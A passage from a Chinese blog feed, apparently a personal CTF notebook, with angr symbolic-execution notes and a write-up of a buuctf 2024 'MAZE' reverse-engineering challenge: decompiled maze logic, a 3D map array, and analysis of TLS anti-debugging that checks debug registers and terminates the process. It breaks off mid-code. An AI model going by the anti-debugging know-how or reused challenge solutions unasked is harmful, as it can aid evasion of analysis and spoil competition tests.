class="comment">#执行到结束</span></span><br></pre></td></tr></table></figure><h4 id="explore">explore</h4><p>用explore方法来探索路径</p><p>方法定义是：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">explore</span>(<span class="params">self, stash=<span class="string">&#x27;active&#x27;</span>, n=<span class="literal">None</span>, find=<span class="literal">None</span>, avoid=<span class="literal">None</span>, find_stash=<span class="string">&#x27;found&#x27;</span>, avoid_stash=<span class="string">&#x27;avoid&#x27;</span>, cfg=<span class="literal">None</span>,num_find=<span class="number">1</span>, **kwargs</span>):</span><br><span class="line"><span class="comment"># find 表示目标地点</span></span><br><span class="line"><span class="comment"># avoid 表示不能到的地点</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">simgr.explore(find=<span class="keyword">lambda</span> s: <span class="string">b&quot;Congrats&quot;</span> <span class="keyword">in</span> s.posix.dumps(<span class="number">1</span>))</span><br><span class="line"><span class="comment"># 求解所有可以让标准输出输出b&quot;Congrats&quot;的路径</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s = simgr.found[<span class="number">0</span>] <span class="comment">#取解</span></span><br><span class="line">flag = s.posix.dumps(<span class="number">0</span>) <span class="comment">#输出内容</span></span><br></pre></td></tr></table></figure><h3 id="求解引擎">求解引擎</h3><p>state.solver</p><p>位向量：比特序列，可以是值或者符号</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">one = state.solver.BVV(<span class="number">1</span>, <span class="number">64</span>)</span><br><span class="line">one_hundred = state.solver.BVV(<span class="number">100</span>, <span class="number">64</span>)</span><br><span class="line">weird_nine = state.solver.BVV(<span class="number">9</span>, <span class="number">27</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>weird_nine.zero_extend(<span class="number">64</span> - <span class="number">27</span>)</span><br><span class="line">&lt;BV64 <span class="number">0x9</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>one + weird_nine.zero_extend(<span class="number">64</span> - <span class="number">27</span>)</span><br><span class="line">&lt;BV64 <span class="number">0xa</span>&gt;</span><br></pre></td></tr></table></figure><p>S带符号,用extend扩展长度</p><p>创建符号变量：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = state.solver.BVS(<span class="string">&quot;x&quot;</span>, <span class="number">64</span>)</span><br><span class="line">y = state.solver.BVS(<span class="string">&quot;y&quot;</span>, <span class="number">64</span>)</span><br></pre></td></tr></table></figure><p>可以直接运算得到AST抽象语法树，使用SMT求解器可以转化AST</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">state.solver.add(x &gt; y)</span><br><span class="line">state.solver.add(y &gt; <span class="number">2</span>)</span><br><span class="line">state.solver.add(<span class="number">10</span> &gt; x)</span><br><span class="line">state.solver.<span class="built_in">eval</span>(x)</span><br></pre></td></tr></table></figure><p>add用来添加约束，eval用来求解</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">state.satisfiable() <span class="comment">#解是否可行</span></span><br></pre></td></tr></table></figure><p>除了朴素的 eval ，angr 提供了多种解析方式 。</p><table><thead><tr><th>接口</th><th>描述</th></tr></thead><tbody><tr><td><code>solver.eval(expression)</code></td><td>将会解出一个可行解</td></tr><tr><td><code>solver.eval_one(expression)</code></td><td>将会给出一个表达式的可行解，若有多个可行解，则抛出异常</td></tr><tr><td><code>solver.eval_upto(expression, n)</code></td><td>将会给出最多n个可行解，如果不足n个就给出所有的可行解。</td></tr><tr><td><code>solver.eval_exact(expression, n)</code></td><td>将会给出n个可行解，如果解的个数不等于n个，将会抛出异常。</td></tr><tr><td><code>solver.min(expression)</code></td><td>给出最小可行解</td></tr><tr><td><code>solver.max(expression)</code></td><td>给出最大可行解</td></tr></tbody></table><p>同时可以设置 <code>extra_constraints</code> 和 <code>cast_to</code>参数对结果进行限制或转换。</p><hr><p><a href="https://xz.aliyun.com/t/7117?time__1311=n4%2BxnD0Dy737qY5ee05%2BbWDOQDCb8DcjxQTYID">angr 系列教程(一）核心概念及模块解读 - 先知社区 (aliyun.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识集 </category>
          
          <category> 逆向 </category>
          
          <category> 工具 </category>
          
          <category> 符号执行 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> re </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf2024秋-RE复现</title>
      <link href="/posts/559c76ab.html"/>
      <url>/posts/559c76ab.html</url>
      
        <content type="html"><![CDATA[<h2 id="MAZE">MAZE</h2><p>这个题比赛的时候没有做出来</p><p>这里重新分析一遍</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="built_in">strlen</span>(Str) )</span><br><span class="line">      print_wrong();</span><br><span class="line">    Sleep(<span class="number">0x28</span>u);</span><br><span class="line">    <span class="keyword">switch</span> ( Str[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v4 % <span class="number">8</span> - <span class="number">1</span> &lt; <span class="number">0</span> )</span><br><span class="line">            print_wrong();</span><br><span class="line">          <span class="keyword">if</span> ( *((_BYTE *)off_7FF692C56200 + v4 - <span class="number">1</span>) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          --v4;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v4 % <span class="number">8</span> + <span class="number">1</span> &gt;= <span class="number">8</span> )</span><br><span class="line">            print_wrong();</span><br><span class="line">          <span class="keyword">if</span> ( *((_BYTE *)off_7FF692C56200 + v4 + <span class="number">1</span>) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          ++v4;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v4 - <span class="number">64</span> &lt; <span class="number">0</span> )</span><br><span class="line">            print_wrong();</span><br><span class="line">          <span class="keyword">if</span> ( *((_BYTE *)off_7FF692C56200 + v4 - <span class="number">64</span>) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v4 -= <span class="number">64</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v4 % <span class="number">64</span> + <span class="number">8</span> &gt;= <span class="number">64</span> )</span><br><span class="line">            print_wrong();</span><br><span class="line">          <span class="keyword">if</span> ( *((_BYTE *)off_7FF692C56200 + v4 + <span class="number">8</span>) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v4 += <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;u&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v4 + <span class="number">64</span> &gt;= <span class="number">512</span> )</span><br><span class="line">            print_wrong();</span><br><span class="line">          <span class="keyword">if</span> ( *((_BYTE *)off_7FF692C56200 + v4 + <span class="number">64</span>) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v4 += <span class="number">64</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;w&#x27;</span>:</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( v4 % <span class="number">64</span> - <span class="number">8</span> &lt; <span class="number">0</span> )</span><br><span class="line">            print_wrong();</span><br><span class="line">          <span class="keyword">if</span> ( *((_BYTE *)off_7FF692C56200 + v4 - <span class="number">8</span>) )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v4 -= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        print_wrong();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">436</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>主函数的switch证明了这是一个迷宫题，有6个方向，可以看出offxxx是地图，根据方向可以对地图的加减可以看出是8*8*8的立体地图</p><p>每一个case里面，都有一个while，想要break必须off +xxx不为0，打开地图数组可以看到全是1和0，说明只有当这个方向的相邻格是1的时候才会停止。也就是说这个迷宫的移动不能在中间停止</p><p>最后，我们得到迷宫重点在436的位置（i,j,k）=(6,6,4)</p><p>画出地图</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">map = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, </span><br><span class="line"><span class="built_in">       1,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       </span></span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       </span></span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       </span></span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       </span></span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       1,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       </span></span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       </span></span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, </span><br><span class="line"><span class="built_in">       0,</span> <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>可得：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">sduwandus</span></span><br></pre></td></tr></table></figure><p>检验后发现结果错误</p><p>于是尝试调试看看哪里有问题</p><p>先检查了一下反调试，发现有tls</p><p>打开</p><p>发现tls还原了一个函数，不知道这个函数在哪里调用的</p><p><img src="https://s2.loli.net/2024/08/24/btP6WvqIp5zZidB.png" alt="image-20240824223727101"></p><p>查找资料显示，这个函数的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( Context.Dr0 || Context.Dr1 || Context.Dr2 || Context.Dr3 )</span><br><span class="line">&#123;</span><br><span class="line">  CurrentProcess = GetCurrentProcess();</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(HANDLE, _QWORD))ProcAddress)(CurrentProcess, <span class="number">0</span>i64);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ProcAddress为ZwTerminateProcess</p><p>检查了是否有断点寄存器的值，如果有就会直接退出</p><blockquote><p>DR0-DR3:存放断点寄存器<br>DR4-DR5:保留<br>DR6:状态寄存器</p><p><a href="https://blog.csdn.net/Rong_Toa/article/details/118557609">调试寄存器：Debug Register-CSDN博客</a></p></blockquote><p>同时调试到这里的时候会发现这个不是主线程，而是其它的线程</p><p>这个线程就会在这里一直循环来反调试</p><p>同时这里的i!=j也很奇怪不知道判断了什么，i是输入的第多少位</p><p>同时从下面得到了另一张地图map2_num</p><p>尝试nop掉反调再调一次</p><p>发现进入这个函数的时候已经要求输入了</p><p><img src="https://s2.loli.net/2024/08/24/kIlKUJcgrHAC8dZ.png" alt="image-20240824231847577"></p><p>于是查找交叉引用，发现__scrt_common_main_seh()中的</p><p>initterm_e((_PIFV *)&amp;First, (_PIFV *)&amp;Last)调用了这个函数</p><p>initterm_e遍历了地址从first到last执行了其中所有函数</p><p>似乎系统认为这个是初始化函数？？</p><p>这里一共有两个用户自定义的函数，第一个为第二个执行初始化，解密字符串</p><p><img src="https://s2.loli.net/2024/08/24/NuxvF3bQezlrfJK.png" alt="image-20240824234314235"></p><p>最后执行了ZwSetInformationThread函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">NTSYSAPI NTSTATUS <span class="title function_">ZwSetInformationThread</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HANDLE          ThreadHandle,</span></span><br><span class="line"><span class="params">  [in] THREADINFOCLASS ThreadInformationClass,</span></span><br><span class="line"><span class="params">  [in] PVOID           ThreadInformation,</span></span><br><span class="line"><span class="params">  [in] ULONG           